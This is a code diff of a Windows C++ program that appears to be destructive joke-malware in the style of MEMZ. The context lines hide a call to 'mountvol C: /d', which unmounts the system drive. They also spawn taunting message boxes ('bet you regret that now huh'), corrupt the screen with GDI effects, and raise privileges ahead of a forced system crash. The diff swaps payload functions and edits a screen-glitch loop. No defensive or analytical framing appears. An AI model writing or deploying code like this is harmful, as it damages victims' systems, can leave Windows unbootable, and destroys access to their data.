@@ -87,7 +87,8 @@ INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpStr, IN
     ShellExecuteA(NULL, "open" "C:\\Windows\\sysnative\\cmd.exe", "mountvol C: /d", NULL, NULL, SW_HIDE);
 
     Sleep(10000);
-    MSGBOXPARAMS msg2 = { 0 };
+
+    MSGBOXPARAMS msg2 = {0};
     msg2.cbSize = sizeof(MSGBOXPARAMS);
     msg2.hwndOwner = NULL;
     msg2.hInstance = GetModuleHandle(NULL);
@@ -105,39 +106,9 @@ INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpStr, IN
     msg1.dwStyle = MB_YESNO | MB_ICONQUESTION;
     HANDLE hmsg3 = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)MessageBoxIndirect, &msg1, NULL, NULL);
 
-    //memz final payload effect but random
-    /*for (int i = 1; i < 50; i++) {
+    //p1();
 
-        //msgbox spam
-        MSGBOXPARAMS msg = { 0 };
-        msg.cbSize = sizeof(MSGBOXPARAMS);
-        msg.hwndOwner = NULL;
-        msg.hInstance = GetModuleHandle(NULL);
-        msg.lpszText = L"bet you regret that now huh";
-        msg.lpszCaption = L"ez";
-        msg.dwStyle = MB_YESNO | MB_ICONQUESTION;
-        HANDLE hmsga = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)MessageBoxIndirect, &msg, NULL, NULL);
-
-        HWND desktop = GetDesktopWindow();
-        HDC desk = GetDC(NULL);
-        RECT rect;
-        GetWindowRect(desktop, &rect);
-        int w = rect.right - rect.left;
-        int h = rect.bottom - rect.top;
-        StretchBlt(desk, rand() % 100, rand() % 100, w - rand() % 100, h - rand() % 100, desk, 0, 0, w, h, MERGECOPY);
-        Sleep(300 - (4 * i));
-        TextOutA(desk, 100, 100, "Hey look its ur screen down below", 34);
-        StretchBlt(desk, 100, 200, 300, 500, desk, 0, 0, w, h, SRCPAINT);
-
-        HRGN hRegion1;
-        hRegion1 = CreateRectRgn(0, 0, w, h);
-        InvertRgn(desk, hRegion1);
-
-        Beep(rand() % 30000, rand() % 1000);
-
-    }*/
-
-    p1();
+    p2();
 
     //i have no idea what this does
     HWND desktop = GetDesktopWindow();
@@ -204,9 +175,9 @@ INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpStr, IN
         InvertRgn(desk, hRegion);
         Sleep(50);
     }
-    for (INT i = 1; i < 50; i++) {
-        BitBlt(desk, sin(i), cos(i), sw, h, desk, rand() % i * 50, rand() % i * 50, PATINVERT);
-    }
+    for (INT i = 1; i < 1000; i += 5) {
+        BitBlt(desk, sin(i) * 5, cos(i) * i, sw, h, desk, rand() % i * 50, rand() % i * 50, SRCCOPY);
+    } 
     ReleaseDC(NULL, desk);
     CloseHandle(hmsg1);
     CloseHandle(hmsg2);
@@ -216,6 +187,7 @@ INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpStr, IN
     TerminateThread(hAudio, 1); //literally not safe
     CloseHandle(hAudio);
 
+    //crash
     BOOLEAN bOld2;
     ULONG ulResponse;
     RtlAdjustPrivilege(19, TRUE, FALSE, &bOld2);
